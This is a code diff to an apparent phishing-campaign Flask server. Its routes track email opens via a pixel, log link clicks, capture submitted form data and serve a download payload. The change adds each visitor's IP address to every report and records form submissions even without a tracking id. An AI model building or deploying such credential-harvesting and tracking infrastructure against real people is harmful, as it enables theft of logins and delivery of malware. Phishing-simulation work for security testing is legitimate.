@@ -45,7 +45,7 @@ def index(tracker=None):
 def url1():
     id = request.args.get('id')
     if id is not None:
-        report_action(id, 'Clicked')
+        report_action(id, 'Clicked', request.remote_addr)
         
     return render_template(
         '1.html',
@@ -58,8 +58,8 @@ def url1():
 @app.route(url_2, methods=['GET', 'POST'])
 def url2():
     id = request.args.get('id')
-    if request.form and id:
-        report_form(id, request.form)
+    if request.form:
+        report_form(id, request.form, request.remote_addr)
 
     try:
         return render_template(
@@ -75,8 +75,8 @@ def url2():
 @app.route(url_3, methods=['GET', 'POST'])
 def url3():
     id = request.args.get('id')
-    if request.form and id:
-        report_form(id, request.form)
+    if request.form:
+        report_form(id, request.form, request.remote_addr)
 
     try:
         return render_template(
@@ -92,8 +92,8 @@ def url3():
 @app.route(url_4, methods=['GET', 'POST'])
 def url4():
     id = request.args.get('id')
-    if request.form and id:
-        report_form(id, request.form)
+    if request.form:
+        report_form(id, request.form, request.remote_addr)
 
     try:
         return render_template(
@@ -109,8 +109,8 @@ def url4():
 @app.route(url_5, methods=['GET', 'POST'])
 def url5():
     id = request.args.get('id')
-    if request.form and id:
-        report_form(id, request.form)
+    if request.form:
+        report_form(id, request.form, request.remote_addr)
     return redirect(redirect_url)
 
 
@@ -119,7 +119,7 @@ def url5():
 def payload():
     id = request.args.get('id')
     if id:
-        report_action(id, 'Downloaded')
+        report_action(id, 'Downloaded', request.remote_addr)
     return app.send_static_file(payload_file)
 
 
@@ -127,5 +127,5 @@ def payload():
 @app.route('/<tracker>/pixel.png')
 def pixel(tracker):
     if tracker is not None:
-        report_action(tracker, 'Opened')
+        report_action(tracker, 'Opened', request.remote_addr)
     return app.send_static_file('pixel.png')
